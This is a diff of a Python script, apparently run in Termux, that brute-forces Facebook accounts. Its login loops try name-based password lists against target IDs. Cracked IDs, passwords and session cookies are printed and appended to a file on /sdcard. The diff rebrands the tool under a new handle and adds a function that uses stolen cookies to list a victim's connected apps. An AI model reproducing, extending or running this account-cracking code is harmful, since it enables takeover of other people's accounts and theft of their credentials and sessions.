@@ -17,6 +17,31 @@ os.system("clear")
 print("\033[1;33m...CHECKING UPDATES....")
 os.system("git pull")
 slp(5)
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
+    else:
+        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            #created by hbf team(owner) Hamii
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
+        print(54*'-')
+    else:
+        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print(57*'-')
 def bypass():
   file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
   file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
@@ -39,35 +64,33 @@ def bypass():
   else:
     main()
 #----------logo----------#
-logo=('''\033[1;36m 
-█▀ █░█ █ █▄▀ █   █▀▄▀█ ▄▀█ █▀▀ █░█ █ █▄░█ ▄▀█
-▄█ █▀█ █ █░█ █   █░▀░█ █▀█ █▄▄ █▀█ █ █░▀█ █▀█
+logo=('''\033[1;33m 
+██████╗░██████╗░░░██╗██╗██╗░░██╗
+██╔══██╗██╔══██╗░██╔╝██║╚██╗██╔╝
+██║░░██║██████╔╝██╔╝░██║░╚███╔╝░
+██║░░██║██╔══██╗███████║░██╔██╗░
+██████╔╝██║░░██║╚════██║██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝
       ''')
 #----------clear----------#
 xy = requests.get('https://api.ipify.org/').text
 os.system('clear')
-print('\r\r\r\33[1;36m              YOUR IP:\33[1;36m'+str(xy))
+print('\r\r\r\33[1;33m              YOUR IP:\33[1;36m'+str(xy))
 time.sleep(5)
 def clear():
     os.system('clear')
     print(logo)
-    print("")
-    print("\033[1;96m ╔═════════════════════════════════╗")
-    print(" ║  \033[1;35mFACE\033[ BOOK BRUTEFORCE 1.0.0       \033[1;36m║")
-    print("\033[1;96m ╠═════════════════════════════════╣")
-    print(" \033[1;36m║  \033[1;35mFB:\033[1;32m SHIKI MACHINA              \033[1;36m║")
-    print(" \033[1;36m║  \033[1;35mSTATUS:\033[1;32m PRIVATE                \033[1;36m║")
-    print("\033[1;36m ║  \033[1;35m◉:\033[1;32m EXIT                        \033[1;36m║")
-    print("\033[1;96m ╚═════════════════════════════════╝")
-    print("")
+    print(42*'═')
+    print(' \033[1;33mFB LINK : https://www.facebook.com/angbo.bomo.75 ')
+    print(' GITHUB  : Scammur')
+    print(' STATUS  : FREE')
+    print(' VERSION : 2.3')
+    print(' IP      : '+xy)
+    print(42*'\033[1;32m═\033[0m')
 #----------line----------#
 def line():
-    print(42*'\033[1;36m═')
+    print(42*'\033[1;32m═')
 #----------menu----------#
-def gffs(ids):
-    get_ffs = requests.get("https://jahsbsbs--andrewvista2005.repl.co/ffs.php?chat="+str(ids)).json()
-    ffs = get_ffs['followers']
-    return ffs
 def main():
     clear()
     print(' [1] FILE CLONING ')
@@ -140,7 +163,7 @@ def m1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [Shiki~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -193,7 +216,7 @@ def m1(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
@@ -214,7 +237,7 @@ def m2(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [Shiki~ M2] %s| \033[1;32mOk\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -268,7 +291,7 @@ def m2(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
@@ -283,4 +306,3 @@ def m2(ids,names,passlist):
       
 #--end--
 bypass()
-      
